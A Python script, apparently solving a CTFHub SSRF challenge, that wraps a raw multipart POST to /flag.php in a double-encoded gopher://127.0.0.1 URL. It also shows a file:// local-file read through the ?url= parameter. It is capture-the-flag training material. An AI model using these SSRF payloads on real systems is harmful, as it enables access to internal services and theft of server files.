import urllib.parse
payload =\
"""
POST /flag.php HTTP/1.1
Host: challenge-5b9f708274bbe39b.sandbox.ctfhub.com:10800
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-Type: multipart/form-data; boundary=---------------------------258861483429430143043913616821
Content-Length: 218
Origin: http://challenge-5b9f708274bbe39b.sandbox.ctfhub.com:10800
Connection: close
Referer: http://challenge-5b9f708274bbe39b.sandbox.ctfhub.com:10800/?url=file:///var/www/html/flag.php
Upgrade-Insecure-Requests: 1
Priority: u=0, i

-----------------------------258861483429430143043913616821
Content-Disposition: form-data; name="file"; filename="1.txt"
Content-Type: text/plain

1
-----------------------------258861483429430143043913616821--
"""
#注意后面一定要有回车，回车结尾表示http请求结束
tmp = urllib.parse.quote(payload)
new = tmp.replace('%0A','%0D%0A')
result = 'gopher://127.0.0.1:80/'+'_'+new
result = urllib.parse.quote(result)
print(result)       # 这里因为是GET请求所以要进行两次url编码
